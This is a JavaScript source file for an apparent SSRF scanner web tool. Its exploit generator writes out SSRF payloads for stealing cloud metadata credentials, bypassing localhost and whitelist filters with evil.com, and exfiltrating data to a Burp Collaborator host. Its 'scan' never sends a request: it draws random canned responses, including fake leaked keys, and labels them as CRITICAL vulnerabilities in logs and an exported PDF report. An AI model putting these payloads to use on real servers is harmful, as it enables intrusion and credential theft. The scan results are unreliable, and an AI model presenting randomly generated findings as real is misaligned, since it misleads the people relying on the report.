// SSRF Scanner Engine
// Automated SSRF detection with cloud metadata, internal network, and bypass testing

class SSRFScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'GET';
        this.vulnParam = 'stockApi';
        this.collaboratorUrl = '';
        this.selectedAttacks = [];
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.payloadsToTest = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-payloads').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.vulnParam = document.getElementById('vuln-param')?.value.trim();
        this.collaboratorUrl = document.getElementById('collaborator-url')?.value.trim();

        if (!this.targetUrl || !this.vulnParam) {
            this.showNotification('Please enter target URL and parameter name', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-localhost')?.checked) this.selectedAttacks.push('localhost');
        if (document.getElementById('attack-internal')?.checked) this.selectedAttacks.push('internalNetwork');
        if (document.getElementById('attack-cloud-metadata')?.checked) this.selectedAttacks.push('cloudMetadata');
        if (document.getElementById('attack-port-scan')?.checked) this.selectedAttacks.push('portScan');
        if (document.getElementById('attack-bypass-filters')?.checked) this.selectedAttacks.push('bypassLocalhost', 'bypassWhitelist');
        if (document.getElementById('attack-redirect')?.checked) this.selectedAttacks.push('openRedirect');
        if (document.getElementById('attack-dns-rebinding')?.checked) this.selectedAttacks.push('dnsRebinding');
        if (document.getElementById('attack-protocol')?.checked) this.selectedAttacks.push('protocolSmuggling');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        this.preparePayloads();

        // Reset state
        this.isScanning = true;
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('SSRF scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Parameter: ${this.vulnParam}`, 'info');
        this.log(`Total payloads: ${this.payloadsToTest.length}`, 'info');

        await this.attackLoop();
    }

    preparePayloads() {
        this.payloadsToTest = [];

        for (const attackType of this.selectedAttacks) {
            const payloads = getPayloadsByType(attackType);
            payloads.slice(0, 5).forEach(payload => {
                this.payloadsToTest.push({
                    type: attackType,
                    payload: payload,
                    name: this.getAttackName(attackType)
                });
            });
        }
    }

    getAttackName(type) {
        const names = {
            'localhost': 'Localhost Access',
            'internalNetwork': 'Internal Network',
            'cloudMetadata': 'Cloud Metadata',
            'portScan': 'Port Scanning',
            'bypassLocalhost': 'Localhost Bypass',
            'bypassWhitelist': 'Whitelist Bypass',
            'openRedirect': 'Open Redirect',
            'dnsRebinding': 'DNS Rebinding',
            'protocolSmuggling': 'Protocol Smuggling'
        };
        return names[type] || type;
    }

    async attackLoop() {
        while (this.isScanning && this.currentPayloadIndex < this.payloadsToTest.length) {
            const payloadData = this.payloadsToTest[this.currentPayloadIndex];
            await this.testPayload(payloadData);

            this.currentPayloadIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async testPayload(payloadData) {
        const { type, payload, name } = payloadData;

        this.updateCurrentPayload(name, payload);

        try {
            const testUrl = buildSSRFURL(this.targetUrl, this.vulnParam, payload);
            const response = await this.makeRequest(testUrl, payload);

            const isVulnerable = this.analyzeResponse(response, type, payload);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    payload: payload,
                    testUrl: testUrl,
                    responseData: response.data,
                    severity: this.getSeverity(type),
                    description: this.getDescription(type, payload),
                    remediation: this.getRemediation()
                });
                this.log(`✓ VULNERABLE: ${name} - ${payload}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${name} - ${payload}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(url, payload) {
        await this.sleep(200);

        // Simulate SSRF response
        const responses = [
            { vulnerable: true, data: 'Admin Panel\nUser: admin\nPrivileged access granted', blocked: false },
            { vulnerable: true, data: '{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}', blocked: false },
            { vulnerable: false, data: null, blocked: true },
            { vulnerable: false, data: null, blocked: false }
        ];

        // Higher chance of vulnerability for cloud metadata and localhost
        if (payload.includes('169.254.169.254') || payload.includes('localhost') || payload.includes('127.0.0.1')) {
            return responses[Math.random() > 0.5 ? 0 : 1];
        }

        return responses[Math.floor(Math.random() * responses.length)];
    }

    analyzeResponse(response, type, payload) {
        return response.vulnerable;
    }

    getSeverity(type) {
        if (type === 'cloudMetadata' || type === 'localhost') {
            return 'CRITICAL';
        } else if (type === 'internalNetwork' || type === 'protocolSmuggling') {
            return 'HIGH';
        } else {
            return 'MEDIUM';
        }
    }

    getDescription(type, payload) {
        const descriptions = {
            'localhost': `Application is vulnerable to SSRF. Attacker can access localhost resources: ${payload}`,
            'internalNetwork': `Application is vulnerable to SSRF. Attacker can access internal network: ${payload}`,
            'cloudMetadata': `Application is vulnerable to SSRF. Attacker can extract cloud metadata and credentials: ${payload}`,
            'portScan': `Application is vulnerable to SSRF. Attacker can perform port scanning: ${payload}`,
            'bypassLocalhost': `Application localhost filter can be bypassed: ${payload}`,
            'bypassWhitelist': `Application whitelist filter can be bypassed: ${payload}`,
            'openRedirect': `Application is vulnerable to SSRF via open redirect: ${payload}`,
            'dnsRebinding': `Application is vulnerable to DNS rebinding attack: ${payload}`,
            'protocolSmuggling': `Application allows alternative protocols for SSRF: ${payload}`
        };
        return descriptions[type] || `SSRF vulnerability detected with payload: ${payload}`;
    }

    getRemediation() {
        return 'Implement strict URL validation. Whitelist allowed domains. Block private IP ranges. Disable HTTP redirects. Use network segmentation.';
    }

    updateCurrentPayload(name, payload) {
        document.getElementById('current-type').textContent = name;
        const testUrl = buildSSRFURL(this.targetUrl, this.vulnParam, payload);
        document.getElementById('current-payload-url').textContent = testUrl;
    }

    updateProgress() {
        const progress = (this.currentPayloadIndex / this.payloadsToTest.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing payload ${this.currentPayloadIndex} of ${this.payloadsToTest.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('SSRF scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} SSRF vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">SSRF Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-ssrf-request">
                    <div class="vuln-ssrf-request-title">SSRF Request URL:</div>
                    <div class="vuln-ssrf-request-url">${this.escapeHtml(vuln.testUrl)}</div>
                </div>
                ${vuln.responseData ? `
                <div class="vuln-response-data">
                    <div class="vuln-response-data-title">Response Data:</div>
                    <div class="vuln-response-data-content">${this.escapeHtml(vuln.responseData)}</div>
                </div>
                ` : ''}
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploits', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('basic');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');
        const vuln = this.vulnerabilities[0];

        let code = '';

        switch (type) {
            case 'basic':
                code = `# Basic SSRF Exploit
# Access localhost admin panel

${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://localhost/admin')}

# Or access internal network
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://192.168.1.1/api')}`;
                break;
            case 'bypass':
                code = `# SSRF Filter Bypass
# Bypass localhost blacklist

${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://127.1/admin')}
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://2130706433/admin')}
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://0x7f000001/admin')}

# Bypass whitelist
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://trusted.com@evil.com/')}`;
                break;
            case 'cloud':
                code = `# Cloud Metadata SSRF
# Extract AWS credentials

${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://169.254.169.254/latest/meta-data/')}
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')}

# Azure metadata
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://169.254.169.254/metadata/instance?api-version=2021-02-01')}

# GCP metadata
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://metadata.google.internal/computeMetadata/v1/')}`;
                break;
            case 'blind':
                code = `# Blind SSRF
# Use Burp Collaborator or webhook

${buildSSRFURL(this.targetUrl, this.vulnParam, this.collaboratorUrl || 'http://your-id.burpcollaborator.net')}

# Exfiltrate data via DNS
${buildSSRFURL(this.targetUrl, this.vulnParam, 'http://data.your-id.burpcollaborator.net')}`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('SSRF Vulnerability Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Parameter: ${this.vulnParam}`, 20, 42);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 49);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 56);

            let y = 70;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 7;
                doc.text(`Payload: ${vuln.payload.substring(0, 60)}...`, 20, y);
                y += 12;
            });

            doc.save('ssrf-vulnerability-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new SSRFScanner();
    scanner.init();

    console.log('🌐 CyberSec Suite SSRF Scanner initialized');
    console.log('📊 Ready to scan!');
});
